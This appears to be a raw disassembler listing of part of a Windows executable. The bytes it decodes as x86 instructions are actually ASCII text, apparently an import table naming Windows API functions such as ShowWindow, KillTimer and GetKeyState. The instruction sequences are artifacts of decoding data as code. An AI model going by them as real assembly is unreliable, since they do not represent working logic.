  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
